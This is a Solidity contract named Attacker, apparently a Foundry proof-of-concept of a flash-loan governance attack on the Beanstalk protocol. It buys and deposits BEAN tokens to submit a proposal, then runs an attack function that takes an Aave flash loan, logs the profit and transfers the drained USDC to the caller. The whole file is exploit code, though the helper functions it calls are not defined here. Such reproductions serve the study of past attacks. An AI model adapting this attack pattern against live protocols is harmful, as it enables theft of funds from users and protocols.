pragma solidity ^0.8.13;
 
import "@oz/token/ERC20/ERC20.sol";
import "@oz/token/ERC20/utils/SafeERC20.sol";
import "@uniswap-v2-periphery/interfaces/IUniswapV2Router02.sol";
import "forge-std/console.sol";
 
contract Attacker {
   using SafeERC20 for ERC20;
 
   ERC20 usdc = ERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
   ERC20 bean = ERC20(0xDC59ac4FeFa32293A95889Dc396682858d52e5Db);
 
   function proposeBip() external payable {
       swapEthForBean();
       console.log(
           "After ETH -> BEAN swap, Bean balance of attacker: %s",
           bean.balanceOf(address(this)) / 1e6
       );
 
       depositAllBean();
       console.log(
           "After BEAN deposit to beanStalk, Bean balance of attacker: %s",
           bean.balanceOf(address(this)) / 1e6
       );
 
       submitProposal();
   }
 
   function attack() external {
       approveEverything();
 
       flashloanAave();
 
       console.log(
           "Final profit, usdc balance of attacker: %s",
           usdc.balanceOf(address(this)) / (10**usdc.decimals())
       );
      
       usdc.transfer(msg.sender, usdc.balanceOf(address(this)));
   }
}